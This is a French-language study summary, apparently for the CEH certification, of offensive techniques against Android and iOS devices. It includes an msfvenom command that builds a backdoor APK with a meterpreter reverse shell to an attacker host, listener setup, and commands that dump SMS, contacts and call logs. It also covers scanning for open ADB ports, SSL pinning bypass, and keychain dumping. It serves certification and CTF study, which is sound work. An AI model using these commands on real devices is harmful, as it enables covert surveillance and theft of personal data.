# CEH M17 - Hacking Mobile Platforms (synthese offensive)

Source: `CEHv13 - Module 17 - Hacking Mobile Platforms hide01.ir.pdf` (186 pages), OCR complet
186/186. Page = pagination du module ("Module 17 Page NNN", commence a 2581). Theorie
d'examen/countermeasures omise sauf reutilisable offensivement.

Structure: Mobile attack vectors -> Hacking Android (rooting, ADB, Metasploit, static/dynamic
analysis) -> Hacking iOS (jailbreak, Cycript/objection, keychain) -> Mobile Device Management
(MDM) / Spyware -> Mobile pentesting (hors scope ici, deja couvert ailleurs).

## 1. Android - Rooting

Rooting = exploiter une vuln du firmware pour copier le binaire SU dans le PATH -> controle
total, acces aux repertoires systeme et aux commandes privilegiees.
- Outils cites: **KingoRoot** (avec/sans PC, plusieurs tentatives parfois necessaires),
  **One Click Root**, **Magisk Manager** (le plus utilise en pratique moderne, root
  "systemless"), **RootMaster**, **KingRoot**, **iRoot**, **TunesGo**.
- Risques a connaitre pour l'attaquant: perte de garantie, instabilite, mais surtout
  desactivation de SafetyNet/Play Integrity sur la cible -> certaines apps bancaires refusent
  de tourner, signal utile pour detecter un device deja root lors d'un audit.

## 2. Android - ADB (Android Debug Bridge)

```
# Activer ADB sans fil sur un device deja connecte en USB
adb tcpip 5555
adb connect <IP_cible>:5555          # puis debrancher l'USB
adb devices                           # confirmer la connexion
adb shell                             # shell interactif sur le device

# Enumeration d'applications installees
adb shell pm list packages            # toutes les apps
adb shell pm list packages -3 -f      # apps tierces uniquement, avec chemin APK

# Logs applicatifs
adb logcat > logcat.log
```
**Exploitation a distance si ADB over TCP (port 5555) est laisse active sans auth** (tres
courant sur devices mal configures/IoT Android): outil **PhoneSploit Pro** - capture d'ecran,
dump d'infos systeme, liste des apps, port forwarding, install/uninstall d'APK, toggle Wi-Fi, a
distance sans aucune authentification au-dela du port ouvert. Reflexe de scan: chercher le
port 5555 ouvert sur le reseau/Shodan (`shodan.io` query `port:5555 adb`).

## 3. Android - Metasploit / backdoor APK

```
# Generer un payload meterpreter sous forme d'APK
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik \
  LHOST=<IP_attaquant> R > Backdoor.apk

# Lister exploits/payloads Android disponibles
msf > search type:exploit platform:android
msf > search type:payload platform:android

# Monter le listener
msf > use exploit/multi/handler
msf > set PAYLOAD android/meterpreter/reverse_tcp
msf > set LHOST <IP_attaquant>
msf > set LPORT <port>
msf > exploit
```
Une fois la session meterpreter obtenue (apres installation+execution de l'APK par la
victime): `sysinfo`, `ipconfig`, `pwd`, `ps`, `dump_sms`, `dump_calllog`, `dump_contacts`,
`webcam_list` - exfiltration cote device sans autre interaction.

## 4. Android - analyse statique/dynamique d'APK

```
# Decompiler un APK (recupere AndroidManifest.xml, smali, resources)
apktool d <App_package>.apk
# Recompiler apres modification (patch, retrait de pinning, etc.)
apktool b <application_directory>

# Hooking dynamique avec Frida sur une app en cours
frida -U -l <hooking_script.js> -f <package_name>
# ex: frida -U -l mainactivityhook.js -f jakhar.aseem.diva
```
- **Frida** permet aussi de lister les apps installees comme alternative a `adb shell pm list
  packages`.
- **MobSF (Mobile Security Framework)**: outil web tout-en-un pour analyse statique ET
  dynamique automatisee d'APK (upload le fichier, rapport de vulnerabilites genere -
  permissions dangereuses, secrets hardcodes, config manifest a risque). Reflexe rapide en
  CTF quand on a juste le fichier APK et peu de temps: upload direct, pas besoin de decompiler
  a la main pour un premier passage.

## 5. Android - Bypass SSL Pinning (reverse engineering)

Approche generale (reverse engineering + patch du code source):
1. Decompiler l'APK (apktool).
2. Localiser les fonctions liees au pinning (recherche de patterns: `TrustManager`,
   `checkServerTrusted`, `CertificatePinner`, noms de methodes contenant "pin"/"ssl"/"trust").
3. Patcher la fonction pour qu'elle retourne systematiquement "valide" (no-op le check).
4. Recompiler + resigner l'APK, reinstaller.
Objectif: permettre un MITM (proxy Burp Suite typiquement) sur une app qui, normalement,
refuse tout certificat autre que celui attendu.

## 6. iOS - Jailbreak

- Objectif: obtenir un acces root a l'OS, lever les restrictions sandbox, permettre le
  sideloading d'apps non signees par Apple.
- Types de jailbreak (classes a connaitre pour choisir l'outil adapte au device/version iOS):
  - **Userland exploit**: acces user-level seulement, pas touche au bootrom/iBoot.
  - **iBoot jailbreak**: acces user-level + iBoot-level.
  - **Bootrom jailbreak**: acces user-level + iBoot-level, exploite une faille non patchable
    par mise a jour logicielle (la plus puissante/durable).
- Techniques de persistance du patch kernel:
  - **Untethered**: reboot normal, kernel reste patche tout seul (ideal).
  - **Semi-tethered**: reboot normal mais perd le jailbreak tant qu'on ne relance pas l'outil
    (le device demarre "non jailbreak" mais utilisable).
  - **Tethered**: necessite de reconnecter a un ordinateur ("boot tethered") a chaque reboot
    pour re-patcher le kernel, sinon reste bloque en demarrage partiel.
  - **Semi-untethered**: similaire au semi-tethered, kernel non patche au reboot mais une app
    sur le device lui-meme peut re-patcher sans PC.
- Outils cites: **checkra1n**, **unc0ver**, **palerain** (palera.in), **Redensa**, **Sileo**
  (gestionnaire de paquets post-jailbreak, equivalent Cydia).

## 7. iOS - manipulation runtime (Cycript, objection, Frida)

```
# Cycript - interpreteur JS qui comprend aussi Objective-C/C++, console interactive
cy# o = {field: 4, value: "http://www.cycript.org"}
cy# [o setObject:a forKey:...]
```
Usage Cycript: **method swizzling** (monkey patching - remplacer l'implementation d'une
methode Objective-C a la volee), bypass d'authentification, bypass de detection de jailbreak.

```
# objection (inclut Frida) - hooking runtime sur une app iOS
objection --gadget <AppName> explore
ios hooking watch class <Class_Name>                 # observer les appels d'une classe
ios hooking watch method "-[Class_Name Method_Name]"  # observer une methode precise
ios hooking set return value "-[Class_Name Function_Name:]" true/false   # forcer le retour

# Bypass direct SSL pinning
ios sslpinning disable

# Bypass direct detection de jailbreak
ios jailbreak disable
```
- **Keychain Dumper**: extrait les secrets du keychain iOS (mots de passe, certificats, cles
  de chiffrement) sur un device jailbreake - cible privilegiee apres acces root.

## 8. Ordre de sonde recommande

1. Identifier la plateforme (Android/iOS) et si le device est deja root/jailbreak (comportement
   d'app bancaire, presence de Magisk/Cydia/Sileo, port ADB 5555 ouvert).
2. Si APK recuperable: MobSF en premier passage rapide (CTF/audit express), puis
   apktool+Frida/objection si patch cible necessaire (SSL pinning, logique métier).
3. Si device physique/emulateur accessible: ADB (`pm list packages`, `logcat`) avant tout
   outil lourd - gratuit en information.
4. Si ADB TCP ouvert sans auth sur le reseau: PhoneSploit Pro = acces quasi complet sans
   exploit, a tenter avant de monter un msfvenom plus complexe.
5. iOS: verifier d'abord la version/jailbreak existant (determine quel outil de jailbreak est
   compatible) avant de tenter un bootrom/checkra1n qui peut ne pas s'appliquer a toutes les
   puces.
